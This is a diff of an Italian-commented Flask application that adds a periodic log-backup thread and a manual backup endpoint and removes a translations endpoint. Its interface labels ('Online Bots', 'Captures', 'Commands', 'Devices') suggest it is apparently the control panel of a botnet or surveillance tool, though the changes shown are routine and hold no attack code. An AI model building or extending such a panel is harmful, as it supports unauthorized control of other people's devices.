@@ -93,15 +93,18 @@ def log_action(device_id, action, details):
     except:
         pass
 
-# ============ BACKUP AUTOMATICO ============
+# ============ BACKUP AUTOMATICO (INDENTAZIONE CORRETTA) ============
 def scheduled_backup():
+    """Esegue il backup dei log ogni 5 minuti"""
     while True:
         time.sleep(300)  # 5 minuti
         backup_logs()
+        print(f"[+] Backup automatico eseguito alle {datetime.now().strftime('%H:%M:%S')}")
 
 # Avvia il thread di backup
 backup_thread = threading.Thread(target=scheduled_backup, daemon=True)
 backup_thread.start()
+print("[+] Thread di backup avviato")
 
 # ============ ROUTES PRINCIPALI ============
 @app.route('/')
@@ -569,6 +572,13 @@ def export_logs():
     conn.close()
     return jsonify([dict(l) for l in logs])
 
+@app.route('/api/logs/backup', methods=['POST'])
+@login_required
+def manual_backup():
+    if backup_logs():
+        return jsonify({'status': 'backup_completed', 'message': 'Log salvati con successo'})
+    return jsonify({'status': 'backup_failed', 'message': 'Errore durante il backup'}), 500
+
 # ============ IMPOSTAZIONI ============
 @app.route('/api/settings', methods=['GET'])
 @login_required
@@ -625,60 +635,6 @@ def save_settings():
     conn.close()
     log_action('system', 'settings_updated', f'Impostazioni aggiornate: theme={theme}, language={language}')
     return jsonify({'status': 'saved'})
-
-@app.route('/api/translations', methods=['GET'])
-@login_required
-def get_translations():
-    lang = request.args.get('lang', 'it')
-    translations = {
-        'it': {
-            'dashboard': 'Dashboard',
-            'devices': 'Dispositivi',
-            'captures': 'Catture',
-            'analytics': 'Analytics',
-            'logs': 'Log',
-            'settings': 'Impostazioni',
-            'logout': 'Esci',
-            'total_devices': 'Dispositivi totali',
-            'online_bots': 'Bot online',
-            'commands': 'Comandi',
-            'system_active': 'Sistema attivo',
-            'refresh': 'Aggiorna',
-            'export': 'Esporta',
-            'delete': 'Elimina',
-            'save': 'Salva',
-            'cancel': 'Annulla',
-            'search': 'Cerca...',
-            'no_data': 'Nessun dato disponibile',
-            'loading': 'Caricamento...',
-            'error': 'Errore',
-            'success': 'Successo'
-        },
-        'en': {
-            'dashboard': 'Dashboard',
-            'devices': 'Devices',
-            'captures': 'Captures',
-            'analytics': 'Analytics',
-            'logs': 'Logs',
-            'settings': 'Settings',
-            'logout': 'Logout',
-            'total_devices': 'Total Devices',
-            'online_bots': 'Online Bots',
-            'commands': 'Commands',
-            'system_active': 'System Active',
-            'refresh': 'Refresh',
-            'export': 'Export',
-            'delete': 'Delete',
-            'save': 'Save',
-            'cancel': 'Cancel',
-            'search': 'Search...',
-            'no_data': 'No data available',
-            'loading': 'Loading...',
-            'error': 'Error',
-            'success': 'Success'
-        }
-    }
-    return jsonify(translations.get(lang, translations['it']))
 
 # ============ SICUREZZA ============
 @app.route('/api/change_password', methods=['POST'])
